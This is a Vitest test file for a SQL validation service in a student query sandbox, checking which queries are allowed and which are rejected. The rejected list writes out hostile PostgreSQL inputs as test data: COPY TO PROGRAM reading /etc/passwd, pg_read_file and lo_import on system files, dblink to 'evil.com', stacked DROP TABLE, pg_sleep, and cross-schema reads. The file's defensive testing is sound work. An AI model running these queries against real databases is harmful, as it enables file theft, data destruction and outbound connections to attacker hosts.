import { describe, it, expect } from "vitest";
import { ValidationService } from "../../src/services/sandbox/validation.service";

describe("ValidationService.validate - allowed queries", () => {
  const allowed = [
    "SELECT * FROM employees WHERE salary > 50000",
    "SELECT id, name FROM employees ORDER BY salary DESC LIMIT 5",
    "WITH t AS (SELECT * FROM employees) SELECT * FROM t",
    "SELECT COUNT(*) FROM employees GROUP BY department",
    "SELECT * FROM employees /* comment; DROP TABLE x */ WHERE id = 1",
  ];

  for (const query of allowed) {
    it(`allows: ${query}`, async () => {
      const result = await ValidationService.validate(query);
      expect(result.isValid).toBe(true);
    });
  }
});

describe("ValidationService.validate - rejected queries", () => {
  const rejected: [string, RegExp][] = [
    ["", /empty/i],
    ["SELECT * FROM employees; DROP TABLE employees;", /multiple/i],
    ["DROP TABLE employees", /SELECT/],
    ["INSERT INTO employees (name) VALUES ('x')", /SELECT/],
    ["UPDATE employees SET salary = 0", /SELECT/],
    ["DELETE FROM employees", /SELECT/],
    ["SELECT * INTO new_table FROM employees", /INTO/],
    ["COPY employees TO PROGRAM 'cat /etc/passwd'", /SELECT/],
    ["SELECT pg_sleep(600)", /pg_sleep/],
    ["SELECT * FROM employees WHERE pg_sleep(10) IS NULL", /pg_sleep/],
    ["WITH t AS (UPDATE employees SET salary = 0 RETURNING *) SELECT * FROM t", /UpdateStmt/],
    ["SELECT dblink('host=evil.com', 'SELECT 1')", /dblink/],
    ["SELECT pg_read_file('/etc/passwd')", /pg_read_file/],
    ["SELECT lo_import('/etc/passwd')", /lo_import/],
    ["CREATE EXTENSION dblink", /SELECT/],
    ["this is not sql at all !!!", /syntax/i],
    // Cross-tenant isolation: sandbox_runner is one shared role across every
    // student, so a schema-qualified reference to another student's schema
    // must be rejected - only unqualified names (resolved via search_path)
    // are allowed.
    ["SELECT * FROM sb_u1_a1.widgets", /qualified/i],
    ["SELECT * FROM public.widgets", /qualified/i],
  ];

  for (const [query, expectedReason] of rejected) {
    it(`rejects: ${query || "(empty)"}`, async () => {
      const result = await ValidationService.validate(query);
      expect(result.isValid).toBe(false);
      expect(result.error).toMatch(expectedReason);
    });
  }
});
